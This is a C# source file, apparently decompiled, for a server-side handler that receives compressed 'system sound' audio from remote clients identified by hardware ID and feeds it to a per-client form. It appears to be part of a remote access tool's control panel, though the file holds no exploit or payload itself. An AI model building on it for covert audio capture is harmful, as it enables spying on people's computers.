using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerSystemSound
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (a == "Sound")
			{
				if (client.Tag == null)
				{
					client.Disconnect();
				}
				else
				{
					((FormSystemSound)client.Tag).Buffer(Decompress((byte[])objects[2]));
				}
			}
			return;
		}
		FormSystemSound form = (FormSystemSound)Application.OpenForms["SystemSound:" + (string)objects[2]];
		if (form == null)
		{
			client.Disconnect();
			return;
		}
		form.Invoke((MethodInvoker)delegate
		{
			form.Text = "System Sound [" + (string)objects[2] + "]";
			form.client = client;
			form.materialSlider1.Enabled = true;
			form.materialSwitch1.Enabled = true;
		});
		client.Tag = form;
		client.Hwid = (string)objects[2];
	}

	private static byte[] Decompress(byte[] inputBytes)
	{
		using MemoryStream memoryStream = new MemoryStream(inputBytes);
		using MemoryStream memoryStream2 = new MemoryStream();
		using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Decompress))
		{
			deflateStream.CopyTo(memoryStream2);
		}
		return memoryStream2.ToArray();
	}
}
